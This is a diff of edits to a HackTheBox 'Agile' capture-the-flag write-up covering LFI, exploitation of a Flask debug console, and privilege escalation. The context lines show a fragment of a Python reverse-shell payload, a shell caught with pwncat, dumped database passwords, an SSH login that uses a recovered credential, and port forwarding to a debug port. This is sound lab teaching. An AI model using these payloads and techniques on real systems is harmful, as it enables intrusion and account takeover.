@@ -15,7 +15,7 @@ layout:
 
 # Agile
 
-Information
+## Information
 
 <table data-header-hidden><thead><tr><th width="374"></th><th align="right"></th></tr></thead><tbody><tr><td>Name</td><td align="right"><img src="../../../.gitbook/assets/agile.png" alt=""></td></tr><tr><td>OS</td><td align="right">Linux</td></tr><tr><td>Difficulty</td><td align="right">Medium</td></tr><tr><td>Vulnerabilities</td><td align="right">LFI, Misconfiguration </td></tr><tr><td>Languages</td><td align="right">Python</td></tr></tbody></table>
 
@@ -60,7 +60,7 @@ The scan reveals ports 22 (SSH) and 80 (Nginx) open.&#x20;
 
 ### Subdomain Brute Force
 
-I will try to brute force the DNS server named "superpass.htb" with `ffuf` to check if there are any different subdomains. However, it doesn't return any results.
+I try to brute force the DNS server named "superpass.htb" with `ffuf` to check if there are any different subdomains. However, it doesn't return any results.
 
 So let's add this vHost to /etc/hosts file.
 
@@ -100,7 +100,7 @@ The download `fn` parameter has vulnerable to LFI
 
 ### Flask Debug
 
-When I try random file path, the page crashes revealing that the server is running Flask in debug mode.
+When I try an invalid request file path, the page crashes revealing that the server is running Flask in debug mode.
 
 <figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
@@ -209,7 +209,7 @@ socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec
 
 <figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
 
-On sending this, I get a shell at my `pwn-cat`
+On sending this, I get a shell at my `pwncat`
 
 {% code overflow="wrap" %}
 ```apacheconf
@@ -274,7 +274,9 @@ mysql> select * from passwords;
 5 rows in set (0.00 sec)
 ```
 
-There's a password for the "agile" which is used by the corum user. I can log in as the corum via SSH. The user flag can be found in `/home/corum/user.txt`
+There's a password for the "agile" which is used by the corum user. &#x20;
+
+Now I can log in as the corum via SSH. The user flag can be found in `/home/corum/user.txt`
 
 ```
 msplmee@kali:~/HTB/Machine/Agile$ pwncat-cs ssh://corum:5db7caa1d13cc37c9fc2@superpass.htb
@@ -289,7 +291,7 @@ user.txt
 
 ## Shell as edwards
 
-Within the `app` directory contains an interesting file: `config_test.json`. This file is not readable by `corum` though. There's a directory for production using `config_prod.json`, and there is also a directory for testing, so let's explore that.
+&#x20;The `app` directory contains an interesting file: `config_test.json`. This file is not readable by `corum` though. There's a directory for production using `config_prod.json`, and there is also a directory for testing, so let's explore that.
 
 ```apacheconf
 corum@agile:/app$ ls -l
@@ -301,8 +303,6 @@ drwxr-xr-x 9 runner    runner    4096 Feb  8 16:36 app-testing
 -rwxr-xr-x 1 root      runner     557 Aug  9 09:21 test_and_update.sh
 drwxrwxr-x 5 root      dev_admin 4096 Feb  8 16:29 venv
 ```
-
-As corum, I can use everything in the application. I'm also able to read most things in the app's testing section.
 
 The `test_and_update.sh` script:
 
@@ -415,7 +415,7 @@ I can connect to it by directly creating a tunnel to TCP port 5555 on Agile.
 msplmee@kali:~$ ssh -L 5555:127.0.0.1:5555 corum@superpass.htb
 ```
 
-I go to `localhost:5555` and see the same page, but it doesn't have any vulnerability for LFI and is not in debug mode.
+I go to `localhost:5555` and see the same page, but it doesn't have LFI vulnerable and is not in debug mode.
 
 Check remote debug port.
 
@@ -426,7 +426,7 @@ corum@agile:/$ netstat -tnlp | grep 41829
 tcp        0      0 127.0.0.1:41829         0.0.0.0:*               LISTEN      -
 ```
 
-I use SSH to tunnel 41829 on my host to 41829 on Agile.
+I use SSH to forward 41829 on my host to 41829 on Agile.
 
 ```apacheconf
 msplmee@kali:~$ ssh -L 41829:127.0.0.1:41829 corum@superpass.htb
@@ -539,7 +539,7 @@ Sudoers I/O plugin version 1.9.9
 Sudoers audit plugin version 1.9.9
 ```
 
-I ran `pspy64` to check any processes that are run by root and found that the `/app/venv/bin/activate` was run by root and owned by the dev\_admin group.
+I run`pspy64` to check any processes that are run by root and found that the `/app/venv/bin/activate` run by root and owned by the dev\_admin group.
 
 ```
 edwards@agile:/$ ls -l /app/venv/bin/activate
